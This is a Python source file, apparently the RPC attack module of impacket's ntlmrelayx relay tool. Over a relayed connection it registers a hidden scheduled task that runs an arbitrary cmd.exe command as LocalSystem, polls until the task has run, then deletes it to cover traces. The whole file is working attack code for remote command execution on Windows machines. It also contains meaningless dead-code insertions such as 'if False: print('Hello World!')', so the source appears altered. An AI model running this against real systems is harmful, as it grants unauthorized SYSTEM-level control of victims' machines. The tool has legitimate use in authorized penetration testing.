import time
import string
import random
from impacket import LOG
from impacket.dcerpc.v5 import tsch
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
PROTOCOL_ATTACK_CLASS = 'RPCAttack'

class TSCHRPCAttack:

    def _xml_escape(self, data):
        if False:
            for i in range(10):
                print('nop')
        replace_table = {'&': '&amp;', '"': '&quot;', "'": '&apos;', '>': '&gt;', '<': '&lt;'}
        return ''.join((replace_table.get(c, c) for c in data))

    def _run(self):
        if False:
            print('Hello World!')
        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
        cmd = 'cmd.exe'
        args = '/C %s' % self.config.command
        LOG.info('Executing command %s in no output mode via %s' % (self.config.command, self.stringbinding))
        xml = '<?xml version="1.0" encoding="UTF-16"?>\n<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n  <Triggers>\n    <CalendarTrigger>\n      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id="LocalSystem">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <StopOnIdleEnd>true</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>true</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context="LocalSystem">\n    <Exec>\n      <Command>%s</Command>\n      <Arguments>%s</Arguments>\n    </Exec>\n  </Actions>\n</Task>\n        ' % (self._xml_escape(cmd), self._xml_escape(args))
        LOG.info('Creating task \\%s' % tmpName)
        tsch.hSchRpcRegisterTask(self.dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        LOG.info('Running task \\%s' % tmpName)
        done = False
        tsch.hSchRpcRun(self.dce, '\\%s' % tmpName)
        while not done:
            LOG.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
            resp = tsch.hSchRpcGetLastRunInfo(self.dce, '\\%s' % tmpName)
            if resp['pLastRuntime']['wYear'] != 0:
                done = True
            else:
                time.sleep(2)
        LOG.info('Deleting task \\%s' % tmpName)
        tsch.hSchRpcDelete(self.dce, '\\%s' % tmpName)
        LOG.info('Completed!')

class RPCAttack(ProtocolAttack, TSCHRPCAttack):
    PLUGIN_NAMES = ['RPC']

    def __init__(self, config, dce, username):
        if False:
            print('Hello World!')
        ProtocolAttack.__init__(self, config, dce, username)
        self.dce = dce
        self.rpctransport = dce.get_rpc_transport()
        self.stringbinding = self.rpctransport.get_stringbinding()

    def run(self):
        if False:
            return 10
        if self.config.command is not None:
            TSCHRPCAttack._run(self)
        else:
            LOG.error('No command provided to attack')